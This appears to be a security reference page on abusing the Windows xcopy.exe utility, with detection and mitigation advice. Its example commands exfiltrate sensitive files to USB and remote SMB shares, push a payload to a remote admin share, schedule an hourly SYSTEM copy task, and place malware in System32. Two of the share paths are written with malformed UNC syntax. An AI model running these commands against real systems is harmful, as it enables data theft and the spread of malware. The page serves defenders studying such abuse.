# xcopy.exe
## What is it?
*```xcopy.exe``` is a command-line utility in Windows that is used for copying files and directories, including subdirectories and file attributes.*
*It is an extended version of the basic ```copy``` command and provides more control over the file copying process, making it useful for backup and system maintenance tasks.*

## Legitimate Usage
- **Backup & File Transfer** → Copy files or directories from one location to another, with the option to preserve file attributes and timestamps (```/E```, ```/H```).
- **Directory Synchronization** → Mirror directories, ensuring that changes in source folders are replicated in destination folders (```/MIR```).
- **Mass File Operations** → Move a large number of files while maintaining folder structure and file properties (```/S```, ```/E```).
- **Batch File Automation** → Use in scripts or batch files to automate file copying tasks in a controlled environment.

## How to abuse it
- **Data Exfiltration** → Attackers can use ```xcopy.exe``` to copy sensitive files from a target system and exfiltrate them to an external device or remote location.
- **Bypassing Security Controls** → ```xcopy.exe``` is a trusted, built-in Windows utility, which makes it effective for bypassing security tools and whitelisting mechanisms.
- **Persistence** → Attackers can use ```xcopy.exe``` in conjunction with other techniques to place malicious payloads on a system for continued execution.
- **Privilege Escalation & Lateral Movement** → ```xcopy.exe``` can be used to move files, including tools or malware, across systems on a network.

## Example attacks
### 1. Data Exfiltration (Copying Files to External Media)
*Attackers can use ```xcopy.exe``` to copy sensitive files from a system to an external USB drive or network share.*
**Copy Files to an External USB Drive**

```
xcopy C:\SensitiveData E:\Backup /E /H /C /Y
```

**Effect:**
- ```/E``` → Copies directories and subdirectories, including empty ones.
- ```/H``` → Copies hidden and system files.
- ```/C``` → Continues copying even if errors occur.
- ```/Y``` → Suppresses confirmation prompts, allowing silent copying.

### 2. Exfiltration via Network Share
*Attackers can copy files over SMB to a remote network share to exfiltrate data silently.*
**Copy Files to a Remote Network Share**

```
xcopy C:\SensitiveData \192.168.1.100\share /E /H /C /Y
```

**Effect:**
- Copies files from the local system to a remote share, bypassing traditional monitoring tools.

### 3. Lateral Movement via File Transfer
*Attackers can move files, such as tools or malware, across systems on a network using ```xcopy.exe```.*
**Copy Malware to Remote System**

```
xcopy payload.exe \192.168.1.50\C$\Windows\Temp /E /H /C
```

**Effect:**
- Copies malicious payload to a remote system via SMB for execution.
- ```/C``` ensures that the operation continues even if errors occur, maintaining the attack's stealth.

### 4. Persistence via Scheduled Tasks
*Attackers can schedule periodic file transfers to maintain access to sensitive data or systems.*
**Schedule File Copy Every Hour**

```
schtasks /create /tn "BackupJob" /tr "xcopy C:\SensitiveData E:\Backup /E /H /Y" /sc hourly /ru SYSTEM
```

**Effect:**
- Creates a scheduled task to copy files every hour, ensuring persistence and continued access to sensitive data.

### 5. Bypassing Execution Restrictions
*```xcopy.exe``` can be used to bypass software restrictions by copying files to trusted directories (e.g., ```C:\Windows\System32```), which are not blocked by security tools like AppLocker or SRP.*
**Copy Malware to a Trusted Directory**

```
xcopy C:\MalwareFolder C:\Windows\System32 /E /H
```

**Effect:**
- Places malicious files in trusted system directories, bypassing application whitelisting and execution restrictions.

# Detection & Mitigation
## Detection Methods
**Monitor File Transfers**
- **Event ID 4663 (File Access)** → Monitor for bulk file movements, especially copying files to external media or remote shares.
- **Look for ```xcopy.exe``` writing to USB devices or network shares**.

**Monitor Scheduled Task Creation**
- **Event ID 4698 (Scheduled Task Created)** → Detect unauthorized scheduled tasks that involve file copying operations.

**Monitor Network Activity**
- **Event ID 5140 (SMB Share Access)** → Track file transfers over SMB to detect unauthorized or suspicious activities.

## Mitigation Strategies
- **Restrict External Device Access** → Prevent unauthorized USB file transfers by disabling external device access or using device control tools.
- **Use Application Control (AppLocker, WDAC)** → Prevent the execution of unauthorized applications, including ```xcopy.exe```, in non-administrative directories.
- **Monitor File Access Logs** → Detect large file transfers or copying activities, especially involving sensitive directories or external devices.
- **Disable SMB/Remote File Shares** → Reduce the attack surface by blocking SMB or restricting access to remote file shares.
